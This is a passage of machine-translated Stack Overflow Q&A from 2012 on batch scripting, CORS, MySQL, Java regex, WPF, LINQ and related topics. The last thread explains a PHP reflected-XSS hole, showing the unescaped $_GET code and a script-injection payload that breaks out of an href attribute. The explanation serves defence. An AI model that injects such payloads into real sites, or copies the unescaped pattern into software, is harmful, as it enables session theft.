4.  就像我说的，这个公式有点简单。它不会产生大于 32767 的数字，这是`%RANDOM%`. 这对您来说可能已经足够了，但如果不是，您可以使用以下*两个*调用将范围扩展到 2 ^(30) -1 ： *`%RANDOM%`*

     *```
    SET /A skip=(%RANDOM%*32768+%RANDOM%)%%lines 
    ```* 

 *因此，这里又是相同的脚本，经过修改以解决上述问题：

```
@ECHO OFF
**IF "%~1"=="" GOTO :EOF
IF NOT EXIST %1 GOTO :EOF**
FOR /F "" %%I IN ('FIND /C /V "" ^<%1') DO SET /A lines=%%I
**IF %lines%==0 GOTO :EOF**
SET /A skip=**(%RANDOM%*32768+%RANDOM%)%%lines**
<%1 (
  FOR /L %%I IN (1,1,%skip%) DO (
    SET /P line=
  )
  SET line=
  SET /P line=
)
ECHO(%line% 
```

另一个注意事项是，如果您愿意，可以添加消息来解释脚本提前终止的原因。基本上，无论你想在哪里添加消息，你只需要替换单个

```
GOTO :EOF 
```

和

```
(ECHO *your message* & GOTO :EOF)
```

例如：

```
IF NOT EXIST %1 (ECHO Error! File not found & GOTO :EOF) 
```*

# jquery - 跨域 $.getJSON 未触发成功功能

> ID：13343145
> 
> 赞同：1
> 
> 时间：2012-11-12T11:46:04.460
> 
> 标签：jquery, json, cross-domain, getjson

这让我很困惑。我正在发送一个跨域请求，我*确定*该请求正在通过并成功返回，但成功函数没有被触发。我没有看到任何警报...

```
jQuery.getJSON('http://xxxx.appspot.com?callback=?', function(json) { 
    //console.log(json);
    alert ('text');
  }); 
```

我有几个迹象表明请求成功：

1.  我在服务器上看到
2.  我在网络选项卡中看到响应代码和正文
3.  当我尝试返回格式错误的 JSON 时，我确实收到了错误。

但在任何情况下，我都不会在成功功能中收到警报

使用不同版本的 jQuery 在几个页面上进行了尝试。

更新：所以我启用了标题，结果仍然完全相同。警报没有触发。

这是响应的标题：

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=ISO-8859-1
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Origin,SOAPserver,SOAPaction,Method,Accept,DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type
Content-Encoding: gzip
Vary: Accept-Encoding
Date: Mon, 12 Nov 2012 12:30:02 GMT
Server: Google Frontend
Cache-Control: private
Content-Length: 36 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T11:48:14.370

正如您清楚地看到它是一个跨域请求，我想您至少知道一点[同源策略](http://en.wikipedia.org/wiki/Same_origin_policy)？

简而言之，如果您没有在服务器上设置[适当的 CORS 标头](https://developer.mozilla.org/en/docs/HTTP_access_control)`appspot.com`，则浏览器没有理由允许脚本分析结果。好消息是，在几乎所有服务器端语言中，[添加相关的标头都非常容易](http://enable-cors.org/)。当然这意味着您可以更改服务器（或者浏览器将其视为服务器，它可能是代理）。

* * *

**编辑 ：**

我注意到刚才`callback=?`在您调用的 URL 中。这意味着您在 JSONP 中调用服务，而不是 JSON（跨域问题的过时解决方案）。由于它不适用于回调语法并且响应标头包含`application/json`，因此您可能会尝试查看它是否处理纯 json。`?callback=?`在 URL 的末尾尝试不使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T11:57:06.957

当谈到 CORS（跨源资源共享）时，它都是关于标头的。

您的请求标头和答案标头是否正确非常重要，否则它将不起作用。

如果您的请求标头不正确，则请求将被服务器无情地杀死。如果答案标题不正确，浏览器客户端将忽略答案。

在答案中，您应该找到以下标头子集：

*   访问控制允许来源
*   访问控制允许凭据
*   访问控制允许方法
*   访问控制允许标头

请求使用的所有来源、方法和标头都必须在服务器应答中允许，否则将被忽略。

例如：

```
Access-Control-Allow-Origin *;
Access-Control-Allow-Credentials true;
Access-Control-Allow-Methods GET, POST, OPTIONS, PUT, DELETE;
Access-Control-Allow-Headers Origin,SOAPserver,SOAPaction,Method,Accept,DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type; 
```

没有更多信息，我不能更有用:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-30T09:47:55.467

也添加这个

`Access-Control-Max-Age: 3600`

另外，检查`Access-Control-Request-Method`浏览器请求。

# sugarcrm - 更新 sugarcrm 的最佳流程是什么？

> ID：13343146
> 
> 赞同：0
> 
> 时间：2012-11-12T11:46:06.140
> 
> 标签：sugarcrm

我有一个客户`SugarCRM 5.5.4`在生产中进行了许多定制。我尝试更新`(5.5.4 > 6.1.0 > 6.2.5 > 6.2.6)`并遇到问题`Studio (6.2.5)`，`ModuleLoader`甚至`Updater (6.2.6)`在那之后。

现在我已经设置了一个新的`6.5.7`安装并更新了所有模块以使其正常工作。

现在将数据从旧版本的糖迁移到新版本的最佳方法是什么？

我与 Talend 合作，但效果不佳（浪费了太多时间）。现在我只是像这样迁移表：

```
INSERT INTO 657.notes ( 
  `assigned_user_id`, `id`, `date_entered`, `date_modified`, `modified_user_id`, 
  `created_by`, `name`, `file_mime_type`, `filename`, `parent_type`, `parent_id`,
  `contact_id`, `portal_flag`, `embed_flag`, `description`, `deleted`  
)
SELECT 
  `assigned_user_id`, `id`, `date_entered`, `date_modified`, `modified_user_id`, 
  `created_by`, `name`, `file_mime_type`, `filename`, `parent_type`, `parent_id`,
  `contact_id`, `portal_flag`, `embed_flag`, `description`, `deleted`  
FROM `554`.notes 
```

我想知道其他人是怎么做的，最好的做法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T15:28:45.857

那应该可以正常工作；请注意，您之后可能需要进行快速重建和修复，以确保数据库全部正确。

# javascript - typeof 返回的自定义值

> ID：13343150
> 
> 赞同：3
> 
> 时间：2012-11-12T11:46:25.847
> 
> 标签：javascript, typeof

有没有办法返回自定义类型而不是“对象”？在下一种情况下，我想返回即“i16”

```
>function Int16(v) { this.v=v }; var n = new Int16(10);

>typeof n
"object"
>Object.prototype.toString.call(n)
"[object Object]" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:03:05.930

将自定义“typeof”属性添加到您的类。然后有一个类似（未经测试）的功能：

```
mytypeof : function (v) {
  type = typeof v;
  return type === "object" && typeof(v["typeof"]) != "undefined" ? v["typeof"] : type;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-07T16:45:27.380

不，你不能重载`typeof`——它总是返回基类型。

在给定的示例中，您可以使用构造函数属性：

```
function Int16(v) { this.v=v }; 
> var n = new Int16(10);
> n.constructor.name
"Int16"
> n.constructor === Int16
true 
```

# eclipse - Eclipse - 将多行的原始数据更改为字符串

> ID：13343157
> 
> 赞同：2
> 
> 时间：2012-11-12T11:46:58.247
> 
> 标签：eclipse

如何在 Eclipse 中自动将一组行对齐到字符串中？

例如

```
String s = "{ "QUOTE_DETAILS": { 
                             "BRANCH_CODE": "0000",
                             "TRANSACTION_TYPE": "TTTT",
                             "EXPIRY_DATE": "10/11/2012"
                            }} 
```

以上组线应自动对齐为

```
String s = "{ \"QUOTE_DETAILS\": { "
                          +"\"BRANCH_CODE\": "0000\", \"TRANSACTION_TYPE\": \"TTTT\","
                          +"\"EXPIRY_DATE": \"10/11/2012\""
                          +"  }}"; 
```

我们有任何选择来实现这一目标吗？

上面的例子只是一个例子，实际上我有大约40多行数据，需要在java中转换为String。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T14:27:15.093

转到*Preferences --> Java --> Editor --> Typing --> In String literals*，并检查是否启用了选项*Escape text when paste into a string literals 。*

# java - Java Word 正则表达式

> ID：13343160
> 
> 赞同：0
> 
> 时间：2012-11-12T11:47:09.430
> 
> 标签：java, string, search, expression

我在Java正则表达式方面很糟糕，所以我希望你们能帮助我。

```
String variable = "My life is better ";
String variable2 = "My life01 is better"; 
```

现在我必须编写一个代码，如果字符串只有“生命”，它将返回 true

所以我应该只为变量而不是变量 2 获得 TRUE，因为它有生命，但也有“01”。

~谢谢。

我试过了

```
if (variable.contains("life")){
System.out.println("TRUE");} 
```

它对两者都返回 TRUE。

查看解决方案：

```
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Test {

    /**
     * @param args
     */
    public static void main(String[] args) {
        // TODO Auto-generated method stub
        Pattern p = Pattern.compile("\\blife\\b");
        Matcher m = p.matcher("life0 is better");
        boolean b = m.find();
        System.out.println(b);

    }

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T11:51:10.447

使用单词边界`\b`匹配。

有关详细信息，请参阅 Java[模式](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html)文档。

请注意，您可能需要将其写入 at`\\b`以获得正确的转义。模式需要 string `\b`，当在`.java`代码中使用时（而不是从文件中读取！）需要以 Java 转义形式编写为`"\\blife\\b"`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T11:51:30.257

使用以下正则表达式： -

```
"\blife\b" 
```

与[`Pattern`](http://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html)和`Matcher`类。这将匹配完整的单词。（`\b`表示词边界）

您必须使用[`Matcher#find`](http://docs.oracle.com/javase/7/docs/api/java/util/regex/Matcher.html#find%28%29)方法来检查字符串是否包含此模式。

* * *

**注意： -**如果您想使用`String.matches`，这在此处比较合适，而不是使用`Pattern`and `Matcher`，您必须`.*`在前面添加 和`end`。因为，`String.matches`匹配整个字符串。

例如： -

```
String str = "asdf life asdf";
System.out.println(str.matches("\\blife\\b"));       // Prints false

System.out.println(str.matches(".*\\blife\\b.*"));  // Prints true 
```

在第二个正则表达式中，`.*`匹配字符串 before 和 after `life`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:06:55.607

使用`String.matches()`方法和正则表达式`\b`来匹配单词边界。

```
public class StringChecker {    
  String variable1 = "My life is better ";
  String variable2 = "My life01 is better";

  System.out.println("variable1: " + containsString(variable1));
  System.out.println("variable1: " + containsString(variable2));
  //Returns true if the string contains "life"
  public boolean containsString(String s){
    return s.matches(".*(\\blife\\b).*");
  }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-04T17:54:22.693

```
package com.rampukar;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
public class DemoRegx {

    public static void main(String[] args) {
        String email = "ram@example.com";
        String EMAIL_PATTERN = "^[_A-Za-z0-9-\\+]+(\\.[_A-Za-z0-9-]+)*@" + "[A-Za-z0-9-]+(\\.[A-Za-z0-9]+)*(\\.[A-Za-z]{2,})$";
        Pattern pt_mail = Pattern.compile(EMAIL_PATTERN);
        Matcher mt_mail = pt_mail.matcher(email);
        if (mt_mail.matches()) {
            System.out.println("Valid");
        } else {
            System.out.println("In-Valid");
        }
        System.out.println("---------------------");

        String name = "Ram Pukar";
        Pattern pt_name = Pattern.compile("[a-zA-Z ]{2,}");
        Matcher mt_name = pt_name.matcher(name);
        if (mt_name.matches()) {
            System.out.println("Valid");
        } else {
            System.out.println("In-Valid");
        }
        System.out.println("---------------------");

        String user = "ram123";
        Pattern pt_user = Pattern.compile("[a-zA-Z0-9]{2,}");
        Matcher mt_user = pt_user.matcher(user);
        if (mt_user.matches()) {
            System.out.println("Valid");
        } else {
            System.out.println("In-Valid");
        }
    }
} 
```

# mysql - mysql查询中的重复列名错误

> ID：13343164
> 
> 赞同：2
> 
> 时间：2012-11-12T11:47:34.437
> 
> 标签：mysql

如果来自我的查询并且不知道如何解决我的查询，我会收到重复列名的错误

```
SELECT distinct(courseid+senderid+recipientid) as diskey,
       mess.id,
       User.firstName as recipientName,
       Course.name,
       senderid,
       recipientid,
       courseid,
       message,
       mess.status,
       mess.createdOn 
FROM 
(
    SELECT * 
    from Message,User,Course 
    where Message.recipientid=User.id 
        and Message.courseid=Course.id 
    order by Message.createdOn DESC
) as mess,
     User,
     Course 
WHERE senderid ='3' 
      OR recipientid='3' 
GROUP BY diskey; 
```

任何人都可以帮忙吗

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T11:49:58.707

为避免重复使用其表为列名添加前缀，如下所示：

```
tab_name.col_name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T09:02:27.573

尝试更换

```
WHERE senderid ='3' 
  OR recipientid='3' 
```

和

```
HAVING senderid ='3' 
  OR recipientid='3' 
```

快乐编码！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T11:55:09.973

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-12T10:37:23.237

为了避免重复写入查询，如下使用前缀（tableName）.columnname：

```
select id, name1,name2 from(
select table1.id,table1.name as name1, table2.name as name2 from
table1
innerjoin table2 on table1.id=table2.table1_id
)group by id 
```

# asp.net - 当 ProgressTemplate 运行时，我如何更改标签？

> ID：13343167
> 
> 赞同：3
> 
> 时间：2012-11-12T11:47:46.217
> 
> 标签：asp.net, updatepanel, updateprogress

当 UpdateProgress 运行时，我如何更改标签（lblSaved）？我的标签在 UpdateProgress 之后更新。我需要，当 UpdateProgress 开始运行时执行 label(lblSaved) visible false。

```
<asp:UpdateProgress ID="uprogAutoSave" AssociatedUpdatePanelID="upnlAutoSave" runat="server">
  <ProgressTemplate>
     <asp:Literal runat="server" Text="<%$ Resources:AutoSave %>" /></ProgressTemplate>
 </asp:UpdateProgress> 
```

...

```
<asp:UpdatePanel ID="UpdatePanel1" RenderMode="Inline" runat="server">
   <Triggers>
        <asp:AsyncPostBackTrigger ControlID="TimerAutoSave" />
   </Triggers>
<ContentTemplate>
          <asp:Label ID="lblSaved" runat="server" />
</ContentTemplate>
                                        </asp:UpdatePanel> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:48:05.927

您必须使用 JavaScript 或 jQuery 从客户端处理 Ajax 事件。您必须在客户端处理两个 Ajax 事件。

1.  OnRequestStart
2.  OnResponseEnd

第一个方法在您的 Ajax 请求开始的同时调用，第二个方法在您的 ajax 请求进入完成状态时调用。
在这种方法中，您必须处理您的标签，而这一切都是 JavaScript/jQuery，所以我假设您在管理标签时不会遇到任何问题。

# python - 如何在python中使用lxml获取img的src？

> ID：13343169
> 
> 赞同：4
> 
> 时间：2012-11-12T11:47:53.093
> 
> 标签：python, lxml

我尝试使用lxml从python中的图像标签解析src，但是当我尝试输出imageurl时，我得到以下信息：

```
[<Element img at 0x921f68c>] 
```

这是我的代码：

```
xhtml = lxml.html.document_fromstring(html)
imageUrl = xhtml.xpath('//img[@alt="something"]') 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-12T11:50:05.710

只需附加`/@src`到您的 xpath 表达式：

```
imageUrl = xhtml.xpath('//img[@alt="something"]/@src') 
```

# ruby-on-rails - 安装“therubyracer-heroku”gem 时出错

> ID：13343170
> 
> 赞同：1
> 
> 时间：2012-11-12T11:47:58.977
> 
> 标签：ruby-on-rails, ruby, node.js, heroku, gem

我正在尝试执行`gem install therubyracer-heroku -v '0.8.1.pre3'`，但是在构建时遇到错误，这是一个很大的日志，但这是最后失败的行（最后粘贴了完整的日志）：

```
g++ -o obj/release/bootstrapper.o -c -Wall -Werror -W -Wno-unused-parameter -Wnon-virtual-dtor -pedantic -m32 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -ansi -fno-rtti -fno-exceptions -fvisibility=hidden -Wall -Werror -W -Wno-unused-parameter -Wnon-virtual-dtor -pedantic -m32 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -ansi -DV8_TARGET_ARCH_IA32 -DENABLE_VMSTATE_TRACKING -DENABLE_LOGGING_AND_PROFILING -DENABLE_DEBUGGER_SUPPORT -Isrc src/bootstrapper.cc
src/bootstrapper.cc: In static member function 'static bool v8::internal::Genesis::CompileScriptCached(v8::internal::Vector<const char>, v8::internal::Handle<v8::internal::String>, v8::internal::SourceCodeCache*, v8::Extension*, v8::internal::Handle<v8::internal::Context>, bool)':
src/bootstrapper.cc:1002:18: error: variable 'result' set but not used [-Werror=unused-but-set-variable]
src/bootstrapper.cc: In member function 'bool v8::internal::Genesis::InstallNatives()':
src/bootstrapper.cc:1227:24: error: variable 'name' set but not used [-Werror=unused-but-set-variable]
cc1plus: all warnings being treated as errors
scons: *** [obj/release/bootstrapper.o] Error 1
scons: building terminated because of errors.
make: *** [build/v8/libv8.a] Error 2
*** extconf.rb failed ***
Could not create Makefile due to some reason, probably lack of
necessary libraries and/or headers.  Check the mkmf.log file for more
details.  You may need configuration options. 
```

我已经在谷歌上搜索了很多小时，并研究了很多类似的问题，但没有任何帮助，我也不知道 mkmf log 的含义是什么以及在哪里可以找到它。

附加信息：

```
OS: Ubuntu, 12.04
I already have nodeJs installed, version is v0.8.14 (Just giving this info, since it may be linked with this)
Ruby version: 1.9.3
RVM is used 
```

# mysql - 为什么 ORDER BY 不使用索引？

> ID：13343173
> 
> 赞同：5
> 
> 时间：2012-11-12T11:48:27.213
> 
> 标签：mysql, sql-order-by

这是我的表：

```
CREATE TABLE `person` (
  `id` bigint(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) DEFAULT NULL,
  `age` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `age` (`age`)
) ENGINE=InnoDB AUTO_INCREMENT=10000 DEFAULT CHARSET=latin1; 
```

这是解释的输出：

```
mysql> explain select * from person order by age\G
*************************** 1\. row ***************************
           id: 1
  select_type: SIMPLE
        table: person
         type: ALL
possible_keys: NULL
          key: NULL
      key_len: NULL
          ref: NULL
         rows: 10367
        Extra: Using filesort
1 row in set (0.00 sec) 
```

这是怎么回事？为什么 MySQL 不使用`age`索引进行排序？我试过 doind `analyze table`，但没有任何区别。

仅供参考，以下是表中数据的分布：

```
mysql> select age, count(*) from person group by age;
+-----+----------+
| age | count(*) |
+-----+----------+
|  21 |     1250 |
|  22 |     1216 |
|  23 |     1278 |
|  24 |     1262 |
|  25 |     1263 |
|  26 |     1221 |
|  27 |     1239 |
|  28 |     1270 |
+-----+----------+
8 rows in set (0.04 sec) 
```

**更新**

@grisha 似乎认为您不能选择不在索引中的字段。这似乎没有任何意义，但是，它看起来像以下作品：

```
mysql> explain select age from person order by age \G
*************************** 1\. row ***************************
           id: 1
  select_type: SIMPLE
        table: person
         type: index
possible_keys: NULL
          key: age
      key_len: 4
          ref: NULL
         rows: 10367
        Extra: Using index
1 row in set (0.00 sec) 
```

而且，如果我添加一个涵盖所有字段的索引，它也可以工作：

```
mysql> alter table person add key `idx1` (`age`, `id`, `name`);
Query OK, 0 rows affected (0.29 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql> explain select * from person order by age\G
*************************** 1\. row ***************************
           id: 1
  select_type: SIMPLE
        table: person
         type: index
possible_keys: NULL
          key: idx1
      key_len: 35
          ref: NULL
         rows: 10367
        Extra: Using index
1 row in set (0.00 sec) 
```

@eggyal 建议使用索引提示。这似乎也有效，并且可能是正确的答案：

```
mysql> explain select * from person force key for order by (age) order by age\G
*************************** 1\. row ***************************
           id: 1
  select_type: SIMPLE
        table: person
         type: index
possible_keys: NULL
          key: age
      key_len: 4
          ref: NULL
         rows: 10367
        Extra: 
1 row in set (0.02 sec) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T11:54:25.570

当您仅选择索引列时，索引可以帮助您进行排序。在您的情况下，您选择`*`，因此`mysql`不使用 index.

***为什么通常索引不能帮助排序？***

如果我们想使用索引`t`按字段对某些表进行排序，我们将这样做：`my_field``my_field`

```
for each my_field f in index, do :
    get all records where my_field = f and add to result
return result 
```

假设不是聚集索引，上面将执行与 t 中的行数一样多的随机 I/O（可能很大），而简单的[外部排序](http://en.wikipedia.org/wiki/External_sorting)算法将按块/页顺序读取数据，并且执行的随机 I/O 会少得多/哦。

所以，你当然可以对 db 说：“我想使用索引进行排序”，但这确实效率不高。

# c# - 非活动列表元素样式

> ID：13343179
> 
> 赞同：0
> 
> 时间：2012-11-12T11:48:59.147
> 
> 标签：c#, .net, wpf

在我们的 WPF (.NET 4.5) 应用程序中，我们希望统一标准列表项选择的外观。激活时，选定的列表/网格项目为蓝色，但失去焦点时，颜色变为灰色。是否有可能以某种方式**在全球范围内**说，当焦点丢失时这些颜色不应该改变？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:01:40.707

那是经常性的！把这个

```
<SolidColorBrush x:Key="{x:Static SystemColors.InactiveSelectionHighlightBrushKey}" Color="#FF3399FF"/> 
```

在您的应用程序或主窗口资源中。

另一种实现方式是定义一个样式，该样式将隐式应用于所有 ListBoxItem、TreeViewItem 等，并将覆盖 ControlTemplate 以更改更改背景颜色的触发器的工作方式。

# compiler-construction - 为什么我们在不同的编译器上得到不同的结果/输出？

> ID：13343182
> 
> 赞同：-2
> 
> 时间：2012-11-12T11:49:10.733
> 
> 标签：compiler-construction, primitive-types

```
#include <stdio.h>
int main () {
    double num = 5.2;
    int var = 5;
    printf("%d\t", sizeof(!num));
    printf("%d\t", sizeof(var = 15/2));
    printf("%d", var);
    return 0;
} 
```

在 VS 2010 和 GCC 4.7.0 上运行该程序会得到输出`1 4 5`，使用 Turbo 3.0/4.5 会得到`2 4 5`结果。

我们从哪里可以获得数据类型的确切大小？

我确实阅读了以下链接：[link1](https://stackoverflow.com/questions/4562249/size-of-primitive-data-types)、[link2](https://stackoverflow.com/questions/2331751/does-the-size-of-an-int-depend-on-the-compiler-and-or-processor)、[link3](https://stackoverflow.com/questions/5041994/different-compilers-different-output)、[link4](https://stackoverflow.com/questions/7209094/why-can-different-c-compilers-give-different-outputs-for-a-c-program)和[link5](https://stackoverflow.com/questions/589575/size-of-int-long-etc) 但他们无法回答我的问题！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:54:00.167

这个问题是一种复杂的方式来询问为什么`sizeof(bool)`在某些编译器中是 1 而在其他编译器中是 2。事实上，C++ 标准并不要求 的大小为`bool`1，这意味着不同的编译器可能会为其分配不同的大小，这就是您问题的答案。

至于*为什么*它不需要它是1，[看看这个相关的问题`sizeof(bool)`](https://stackoverflow.com/questions/5067492/why-the-sizeofbool-is-not-defined-to-be-one-by-the-standard-itself)。

如果您根本不清楚`bool`这里为什么涉及，那是因为您`!`在 double 值上调用了运算符，这相当于检查它是否为非零，并且这样的检查返回一个`bool`. 其他两个打印基本上是`sizeof(int)`（因为`int / int`是一个`int`本身）和一个整数的值。

# java - 分解为更多类并添加构造函数

> ID：13343183
> 
> 赞同：0
> 
> 时间：2012-11-12T11:49:17.380
> 
> 标签：java, file, class, methods, constructor

我想问你是否可以将我的代码更改/分解为 2-3 个类，添加构造函数（如果可能不为空）和/或添加更多方法。如果需要程序可以有更多的功能。

```
 public class Testing {

            public static void main(String args[]) throws Exception {
                Scanner input = new Scanner(System.in);
                System.out.println("Select word from list:");
                System.out.println();

                try {
                    FileReader fr = new FileReader("src/lt/kvk/i3_2/test/List.txt"); // this is list of words, everything all right here
                    BufferedReader br = new BufferedReader(fr);
                    String s;
                    while((s = br.readLine()) != null) {
                        System.out.println(s);
                    }
                    fr.close();
                    String stilius = input.nextLine();   // eneter word which I want to count in File.txt
                    BufferedReader bf = new BufferedReader(new FileReader("src/lt/kvk/i3_2/test/File.txt")); // from this file I need to count word which I entered before

                    int counter = 0;                
                    String line;

                    System.out.println("Looking for information");
                    ArrayList<String> resultList = new ArrayList<String>();
                    String name = null;
            while (( line = bf.readLine()) != null){
                    if (line.trim().length() == 0) name = null;
                    else if (name == null) name = line;
                    int indexfound = line.indexOf(stilius);
                          if (indexfound > -1) {
                   counter++;
                   resultList.add(name);
   }
                    }
                    if (counter > 0) {
                        System.out.println("Word are repeated "+ counter + "times");}
                        else {
                        System.out.println("Error...");
                    }
                    bf.close(); 

                }
                catch (IOException e) {
                    System.out.println("Error:" + e.toString());
                    }
                }
            } 
```

从 file.txt 计算单词（通过键盘输入）并选择谁重复了这个单词，例如：如果我输入单词：`One`它显示：

```
Word One repeated 3 times by John, Elisa, Albert 
```

file.txt 看起来像：

```
John //first line - name
One
Three
Four

Peter //first line - name
Two
Three

Elisa //first line - name
One
Three

Albert //first line - name
One
Three
Four

Nicole //first line - name
Two
Four 
```

我真的不知道是否可以将此代码分解为 2-3 个类。如果有人可以帮助我，非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:43:01.663

我将从定义两个类开始：

*   字文件
*   WordFileEntry

一个 WordFile-object 应该包含一个 WordFileEntry-objects 的列表。WordFileEntry 由字符串名称和 List<String> 单词组成。

重复计数可以由 WordFile 对象本身完成。读取文件的逻辑可以写在 WordFile 类或单独的类中。

# python - iOS 6：libpython2.7.a 初始化导入错误

> ID：13343184
> 
> 赞同：3
> 
> 时间：2012-11-12T11:49:22.420
> 
> 标签：python, ios, embedded

卡在 iOS 上的初始化嵌入式 Python 上。我从 Kivy 项目中获取了构建脚本。它生成了 libpython2.7.a、Python27.zip 并包含在内。

所以，我的应用程序将 zip 解压缩到 /Documents/lib/python2.7

尝试设置 Python：

```
dirPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                               NSUserDomainMask, YES);
docsDir = [dirPaths objectAtIndex:0];
Py_SetPythonHome((char *)[docsDir UTF8String]);
Py_SetProgramName("");
Py_Initialize(); 
```

适逢：

```
ImportError: No module named site 
```

据我了解，它无法找到 Python 主路径。但是，如果我通过以下方式修复网站：

```
Py_NoSiteFlag=1;
PyRun_SimpleString("import sys as s\nprint(s.path)"); 
```

它输出有效路径：

```
['/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python27.zip', '/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python2.7/', '/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python2.7/plat-darwin', '/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python2.7/plat-mac', '/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python2.7/plat-mac/lib-scriptpackages', '/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python2.7/lib-tk', '/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python2.7/lib-old', '/var/mobile/Applications/1BC015FC-2F7A-41C0-8F3A-70A22510C3A3/Documents/lib/python2.7/lib-dynload'] 
```

但没有一个进口作品。为了使 Python 正确使用模块，我必须解决什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-19T13:02:45.550

已经自己修好了。我的错误是： - 需要将所有 python /lib 文件作为目录（而不是组）放在基本程序文件中 - 在构建阶段“上传资源”列表中添加此目录 - 在构建阶段将“上传资源”阶段置于“编译程序”之上”。不知道为什么，但它有帮助。

# c# - linq每周分组？

> ID：13343185
> 
> 赞同：0
> 
> 时间：2012-11-12T11:49:26.850
> 
> 标签：c#, linq, group-by

林克

```
from c in customerReadings
group c by new { date = GetGroupingDateKey(DateRangeType, c.ReadDate), name = c.Name } into g
select new MeterReadingsForChart
{
    ReadDate = g.Key.date,
    Name = g.Key.name,
    Value = g.Sum(y => y.Value),
    TimeInterval = DateRangeType
}; 
```

GetGroupingDateKey()

```
private static DateTime GetGroupingDateKey(MeterReadingsTimeIntervals DateRangeType, DateTime Date)
{
    DateTime date = new DateTime();
    switch (DateRangeType)
    {
        case MeterReadingsTimeIntervals.Hourly:
            //For Example data is betweet 10:05 - 11:05
            //DateTime offSet = Date.AddMinutes(-5);
            //date = new DateTime(offSet.Year, offSet.Month, offSet.Day, offSet.Hour, 5, 0);
            date = new DateTime(Date.Year, Date.Month, Date.Day, Date.Hour, 0, 0);
            break;
        case MeterReadingsTimeIntervals.Daily:
            date = new DateTime(Date.Year, Date.Month, Date.Day, 0, 0, 0);
            break;
        case MeterReadingsTimeIntervals.Weekly:
            date = Date.AddDays(-((7 + Date.DayOfWeek - DayOfWeek.Monday) % 7));
            break;
        case MeterReadingsTimeIntervals.Monthly:
            date = new DateTime(Date.Year, Date.Month, 1, 0, 0, 0);
            break;
        case MeterReadingsTimeIntervals.Yearly:
            date = new DateTime(Date.Year, 1, 1, 0, 0, 0);
            break;
    }

    return date;
} 
```

记录时间：10/10/2012 - 09:15 至 10:15

```
Hourly groupped data count  : 2 (expected)

Daily groupped data count   : 1 (expected)

Weekly groupped data count  : 5 (group count (not expected))

Monthly groupped data count : 1 (expected)

Yearly groupped data count  : 1 (expexted) 
```

如何按周对记录进行分组。我的每周分组有什么问题？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T11:53:41.380

我想你`Date`有一个时间部分 - 你需要将它归零，例如

```
date = Date.Date.AddDays(-((7 + Date.DayOfWeek - DayOfWeek.Monday) % 7)); 
```

# php - 为什么这是 XSS 攻击以及如何防止这种情况？

> ID：13343186
> 
> 赞同：1
> 
> 时间：2012-11-12T11:49:35.947
> 
> 标签：php, xss

我有这个 php 代码，我的 CMS 安全自动测试表明这是 XSS 攻击。为什么以及如何解决这个问题？

```
$url = "news.php";
if (isset($_GET['id']))
  $url .= "?id=".$_GET["id"];
echo "<a href='{$url}'>News</a>"; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T11:54:18.100

这是 XSS（跨站点脚本），因为有人可以这样称呼您的东西：

```
?id='></a><script type='text/javascript'>alert('xss');</script><a href=' 
```

基本上把你的代码变成

```
<a href='news.php?id='></a><script type='text/javascript'>alert('xss');</script><a href=''>News</a> 
```

现在，每当有人访问该站点时，它都会加载并运行`alert('xss');`可能是重定向器或 cookie 窃取器的 javascript。

